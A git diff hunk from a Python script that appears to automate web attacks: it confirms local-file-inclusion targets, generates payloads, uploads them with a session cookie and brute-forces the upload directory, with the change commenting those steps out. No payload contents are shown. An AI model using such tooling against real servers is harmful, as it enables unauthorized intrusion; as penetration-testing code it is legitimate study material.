@@ -65,23 +65,23 @@ def main():
             lfi_confirmed_targets.add(target)
 
     # Generate the payloads
-    payload_filenames = uploadv2.create_payloads()
-
+    # payload_filenames = uploadv2.create_payloads()
+    
     # Use dynamic wordlists to determine endpoints:
     # dynamic_upload_url = uploadv2.try_upload_url(args.url, args.upload_url_wordlist, COOKIE, PAYLOAD_FILENAME)
     # if dynamic_upload_url is None:
     #     print("[-] No valid upload URL found. Exiting.")
     #     exit(1)
 
-    for url in uploadable_urls:
-        if uploadv2.upload_file(url, PAYLOAD_FILENAME, COOKIE):
-            print(f"[+] File upload Success. URL: {url}.")
+    # for url in uploadable_urls:
+    #     if uploadv2.upload_file(url, PAYLOAD_FILENAME, COOKIE):
+    #         print(f"[+] File upload Success. URL: {url}.")
 
-    dynamic_upload_dir = uploadv2.get_upload_directory(
-        URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
-    )
-    # print(f"Dynamic Upload URL: {dynamic_upload_url}")
-    print(f"Dynamic Upload Directory: {dynamic_upload_dir}")
+    # dynamic_upload_dir = uploadv2.get_upload_directory(
+    #     URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
+    # )
+    # # print(f"Dynamic Upload URL: {dynamic_upload_url}")
+    # print(f"Dynamic Upload Directory: {dynamic_upload_dir}")
 
     # # Upload the payload using the dynamic endpoint
     # if not uploadv2.upload_file(dynamic_upload_url, PAYLOAD_FILENAME, COOKIE):
